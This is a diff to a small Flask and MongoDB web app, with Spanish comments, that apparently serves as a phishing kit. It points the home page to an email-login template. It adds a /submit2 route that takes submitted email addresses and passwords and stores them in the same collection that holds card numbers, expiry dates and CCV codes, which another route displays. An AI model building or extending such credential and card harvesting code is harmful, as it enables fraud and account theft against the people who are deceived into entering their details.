@@ -19,7 +19,7 @@ collection = db['mi_coleccion']
 
 @app.route('/')
 def index():
-    return render_template('index.html')
+    return render_template('correo.html')
 
 
 @app.route('/get_image_urls')
@@ -36,6 +36,27 @@ def tabla():
     documentos = collection.find()
     return render_template('tarjeta.html', documentos=documentos)
 
+
+
+@app.route('/submit2', methods=['POST'])
+def submit2():
+  # Obtener los datos del formulario
+    inputNumero = request.form['email']
+    inputNombre = request.form['password']
+   
+
+    # Insertar los datos en la colección
+    documento = {
+        "numero_tarjeta": inputNumero,
+        "nombre": inputNombre,
+        "mes_expiracion": "-",
+        "year_expiracion": "-",
+        "ccv": "-"
+    }
+    collection.insert_one(documento)
+
+    # Redirigir a la página principal
+    return render_template('index.html')
 
 
 @app.route('/submit', methods=['POST'])
